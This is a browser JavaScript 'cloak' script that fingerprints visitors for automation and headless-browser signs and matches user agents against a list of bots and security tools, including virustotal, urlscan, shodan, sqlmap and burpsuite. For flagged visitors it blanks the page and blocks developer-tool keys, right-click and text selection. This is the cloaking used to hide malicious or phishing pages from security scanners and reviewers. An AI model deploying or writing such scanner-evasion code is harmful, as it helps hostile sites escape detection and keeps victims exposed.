(function () {
  'use strict';

  if (window.__VG_CLOAK && window.__VG_CLOAK.version) return;

  if (window.__CLOAK_ENABLED === false || window.__CLOAK_ENABLED === 'false') return;

  var SOFT_THRESHOLD = 6;  
  var STRONG_WEIGHT  = 3;  

  var cloak = {
    version: 1,
    bot: false,
    hard: false,
    strong: false,
    score: 0,
    reasons: [],
    cloaked: false
  };
  window.__VG_CLOAK = cloak;

  function note(weight, reason) {
    cloak.score += weight;
    cloak.reasons.push(reason);
    if (weight >= STRONG_WEIGHT) cloak.strong = true;
  }

  function hardBot(reason) {
    cloak.bot = true;
    cloak.hard = true;
    cloak.reasons.push(reason);
  }

  var nav = navigator;
  var ua = '';
  try { ua = String((nav && nav.userAgent) || ''); } catch (e) { ua = ''; }
  var uaL = ua.toLowerCase();
  var claimsChrome = uaL.indexOf('chrome') !== -1 || uaL.indexOf('chromium') !== -1 || uaL.indexOf('edg/') !== -1;
  var isMobile = uaL.indexOf('mobile') !== -1 || uaL.indexOf('android') !== -1 ||
                 uaL.indexOf('iphone') !== -1 || uaL.indexOf('ipad') !== -1;
  var isDesktop = !isMobile;


  try { if (nav && nav.webdriver === true) hardBot('webdriver'); } catch (e) {}
  try {
    var wdDesc = Object.getOwnPropertyDescriptor(nav, 'webdriver');
    if (wdDesc && (wdDesc.value === true || typeof wdDesc.get === 'function')) {
      hardBot('webdriver_descriptor');
    }
  } catch (e) {}

  var DRIVER_GLOBALS = [
    '__webdriver_evaluate', '__selenium_evaluate', '__fxdriver_evaluate',
    '__webdriver_script_fn', '__webdriver_script_value', '__webdriver_script_command',
    '__selenium_unwrapped_', '__fxdriver_unwrapped_', '__webdriver_unwrapped_',
    '__driver_evaluate', '__nightmare', '__playwright', '__pw_init', '__pw_inspector__',
    '_Selenium_IDE_Recorder', 'callSelenium', 'callPhantom', '_phantom',
    '__phantomas', 'domAutomation', 'domAutomationController',
    '$cdc_asdjflasutopfhvcZLmcfl_'
  ];
  for (var gi = 0; gi < DRIVER_GLOBALS.length; gi++) {
    try {
      if (window[DRIVER_GLOBALS[gi]]) { hardBot('driver_global:' + DRIVER_GLOBALS[gi]); break; }
    } catch (e) {}
  }
  try {
    if (window.document && (window.document.__webdriver_evaluate || window.document.__selenium_evaluate)) {
      hardBot('document_driver');
    }
  } catch (e) {}

  try {
    if (window.document) {
      var dkeys = Object.keys(window.document);
      for (var di = 0; di < dkeys.length; di++) {
        if (dkeys[di].indexOf('cdc_') === 0 || dkeys[di].indexOf('$cdc_') === 0) { hardBot('cdc_key'); break; }
      }
    }
  } catch (e) {}

  try { if (window._chrome && !window.chrome) hardBot('chrome_spoof'); } catch (e) {}

  var UA_SIGNATURES = [
    'bot', 'crawler', 'spider', 'scraper', 'crawling',
    'headless', 'phantomjs', 'puppeteer', 'playwright',
    'selenium', 'webdriver', 'automation',
    'nmap', 'masscan', 'zaproxy', 'burpsuite',
    'sqlmap', 'nikto', 'wget', 'curl',
    'axios', 'guzzle', 'python-requests', 'java/',
    'okhttp', 'postman', 'insomnia',
    'scrapy', 'beautifulsoup', 'httpx',
    'monitor', 'checker', 'probe', 'scanner',
    'uptime', 'statuscake', 'pingdom',
    'virustotal', 'urlscan', 'shodan', 'censys'
  ];
  for (var si = 0; si < UA_SIGNATURES.length; si++) {
    if (uaL.indexOf(UA_SIGNATURES[si]) !== -1) { hardBot('ua:' + UA_SIGNATURES[si]); break; }
  }
  try { if (uaL.length < 12) hardBot('ua_short'); } catch (e) {}

  function softSignals() {

    try { if (!nav.languages || nav.languages.length === 0) note(3, 'no_languages'); } catch (e) {}
    try { if (!nav.language) note(1, 'no_language'); } catch (e) {}

    if (isDesktop) {
      try {
        if (nav.plugins && nav.plugins.length === 0 && nav.mimeTypes && nav.mimeTypes.length === 0) {
          note(2, 'no_plugins');
        }
      } catch (e) {}
    }
    if (claimsChrome && !isMobile) {
      try { if (!window.chrome) note(2, 'no_window_chrome'); } catch (e) {}
      try { if (!nav.userAgentData) note(1, 'no_user_agent_data'); } catch (e) {}
      try { if (nav.pdfViewerEnabled === false) note(1, 'no_pdf_viewer'); } catch (e) {}
      try { if (!nav.connection) note(1, 'no_connection'); } catch (e) {}
    }


    try { if (!window.outerWidth || !window.outerHeight) note(3, 'zero_outer_size'); } catch (e) {}
    try { if (!screen.width || !screen.height) note(3, 'zero_screen_size'); } catch (e) {}
    try { if (window.innerWidth === 0 || window.innerHeight === 0) note(2, 'zero_inner_size'); } catch (e) {}

    try {
      if (!nav.hardwareConcurrency || nav.hardwareConcurrency <= 0) note(1, 'no_hardware_concurrency');
    } catch (e) {}
    try {
      if (claimsChrome && !isMobile && nav.deviceMemory !== undefined && nav.deviceMemory <= 0) note(1, 'zero_device_memory');
    } catch (e) {}

    try {
      var canvas = document.createElement('canvas');
      var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl && gl.getParameter) {
        var dbg = gl.getExtension('WEBGL_debug_renderer_info');
        var rend = dbg ? String(gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || '') : '';
        var rl = rend.toLowerCase();
        if (rl.indexOf('swiftshader') !== -1 || rl.indexOf('llvmpipe') !== -1 ||
            rl.indexOf('software') !== -1 || rl.indexOf('mesa offscreen') !== -1) {
          note(1, 'software_webgl');
        }
      }
    } catch (e) {}
  }


  function installGuard() {
    try {
      if (document.getElementById('vgCloakGuard')) return;
      var g = document.createElement('div');
      g.id = 'vgCloakGuard';
      g.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;z-index:2147483647;' +
        'background:#fff;margin:0;padding:0;border:0;';
      (document.body || document.documentElement).appendChild(g);
    } catch (e) {}
  }

  function wipe(reason) {
    if (cloak.cloaked) return;
    cloak.cloaked = true;

    try { window.__VG_BLANKED = true; } catch (e) {}

    try {
      if (window.__VG_LOG) window.__VG_LOG('warn', '[VG] cloak: ' + (reason || cloak.reasons.join('|')));
    } catch (e) {}

    try {
      document.open();
      document.write('<!DOCTYPE html><html><head><meta charset="UTF-8">' +
        '<meta name="viewport" content="width=device-width,initial-scale=1">' +
        '<style>html,body{margin:0;padding:0;background:#fff;height:100%;overflow:hidden;' +
        'user-select:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none}</style>' +
        '<script>document.addEventListener("keydown",function(e){if(e.ctrlKey||e.metaKey){e.preventDefault();e.stopPropagation()}' +
        'if(e.key==="F12"){e.preventDefault()}});document.addEventListener("contextmenu",function(e){e.preventDefault()});' +
        'document.addEventListener("selectstart",function(e){e.preventDefault()})<\/script>' +
        '</head><body></body></html>');
      document.close();
    } catch (e) {
      try {
        document.documentElement.innerHTML = '';
        if (document.body) document.body.style.background = '#fff';
      } catch (e2) {}
    }
  }

  if (cloak.bot) installGuard();

  function evaluate() {
    if (cloak.bot) { wipe('hard:' + cloak.reasons.join('|')); return; }

    try { softSignals(); } catch (e) {}

    if (cloak.strong && cloak.score >= SOFT_THRESHOLD) {
      cloak.bot = true;
      wipe('soft:' + cloak.reasons.join('|'));
    }
  }

  window.__VG_CLOAK.evaluate = evaluate;
  window.__VG_CLOAK.wipe = wipe;

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', evaluate);
  } else {
    evaluate();
  }
})();

